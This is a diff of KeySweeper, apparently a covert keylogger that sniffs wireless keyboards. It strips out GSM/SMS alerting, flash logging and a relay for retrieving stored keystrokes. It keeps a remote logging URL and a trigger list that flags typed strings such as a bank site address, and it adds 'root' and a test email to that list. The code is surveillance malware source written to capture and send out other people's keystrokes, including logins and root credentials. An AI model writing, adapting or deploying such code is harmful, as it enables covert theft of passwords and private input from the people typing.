@@ -54,50 +54,23 @@
  
  */
 
-// should we run with a GSM FONA board attached?
-// if not, you can still retrieve keystrokes over a
-// secondary remote KeySweeper wirelessly (over 2.4GHz)
-//#define ENABLE_GSM
+#include <SoftwareSerial.h>
 
-// number to send sms to upon trigger words (only if ENABLE_GSM is defined)
-char *SMSnumber = "3105551212";
 
 // log online to this url (only if ENABLE_GSM is defined)
 #define URL "samy.pl/keysweeper/log.php?"
 
 // support 2 triggers up to 20 bytes each (change this as you wish)
-#define TRIGGERS 2
+#define TRIGGERS 3
 #define TRIGGER_LENGTH 20
 char triggers[TRIGGERS][TRIGGER_LENGTH];
 void setTriggers()
 {
   strncpy(triggers[0], "www.bank.com", TRIGGER_LENGTH-1);
-  strncpy(triggers[1], "user@samy.pl", TRIGGER_LENGTH-1);
+  strncpy(triggers[1], "test@test.org", TRIGGER_LENGTH-1);
+  strncpy(triggers[2], "root", TRIGGER_LENGTH-1);
 }
 
-// uncomment #define FLASH if you are using an SPI Flash module to log data
-// I'm specifically using the 8mbit W25Q80BV
-//#define FLASH
-
-// only enable if you want this to connect to a KeySweeper
-// rather than look for the keyboard itself. this is useful
-// to download keyboard logs from a KeySweeper device
-// BECAUSE I BACKTRACED IT
-//#define BACKTRACER 1
-
-// pins on the microcontroller
-#define CE 9
-#define CSN 8 // normally 10 but SPI flash uses 10
-#define FONA_TX 3
-#define FONA_RST 4
-#define FONA_RX 5 // was 2, but we're going to use that for an interrupt (RI)
-#define LED_PIN 6 // tie to USB led if you want to show keystrokes
-#define PWR_PIN 7 // are we powered via USB 
-
-// address to listen for an optional secondary device
-// that we can wirelessly send recorded keystrokes back to,
-// and it can come and pick up recorded keystrokes from flash
-uint64_t backtraceIt = 0xBADC0DEDLL;
 
 // if you want to also monitor the keystrokes live,
 // enable shoutKeystrokes, and you can simply listen to
@@ -117,25 +90,7 @@ uint32_t strokeTime = 0;
 // Serial baudrate
 #define BAUDRATE 115200
 
-#ifdef ENABLE_GSM
-#include <SoftwareSerial.h>
 
-// You'll need to use my modified FONA library here:
-// https://github.com/samyk/Adafruit_FONA_Library
-#include "Adafruit_FONA.h"
-
-// this is a large buffer for replies
-char replybuffer[255];
-
-SoftwareSerial fonaSS = SoftwareSerial(FONA_TX, FONA_RX);
-Adafruit_FONA fona = Adafruit_FONA(&fonaSS, FONA_RST);
-
-int8_t last_sms;
-int8_t sms_interrupt = 0;
-
-char imei[15] = { 
-  0     }; // MUST use a 16 character buffer for IMEI!
-#endif // ENABLE_GSM
 
 #define sp(a) Serial.print(F(a))
 #define spl(a) Serial.println(F(a))
@@ -157,20 +112,6 @@ char imei[15] = {
 //#define E_CHANS      0x06 // 1 byte
 //#define E_FIRST_RUN  0x07 // 1 byte 
 
-#ifdef FLASH
-#include <Adafruit_TinyFlash.h>
-
-// 256 bytes per page of flash
-#define FLASHPAGE 256
-
-#define writeFlash() eWrite(E_FLASH_ADDY, flashAddy)
-#define FLASHSETUP 0xBA
-uint8_t buffer[FLASHPAGE];
-uint32_t flashAddy;
-uint32_t flashByte = 0;
-uint32_t isFlash = 0;
-Adafruit_TinyFlash flash;
-#endif
 
 
 #define csn(a) digitalWrite(CSN, a)
@@ -183,7 +124,7 @@ Adafruit_TinyFlash flash;
 //a9399d5fcd,05,08
 //a9399d5fcd,09,08
 // my keyboard channel has been on 0x19, 0x34, 0x05, 0x09, 0x2c
-/* me love you */long time;
+long time;
 uint8_t channel = 25; // [between 3 and 80]
 uint16_t lastSeq = 0;
 
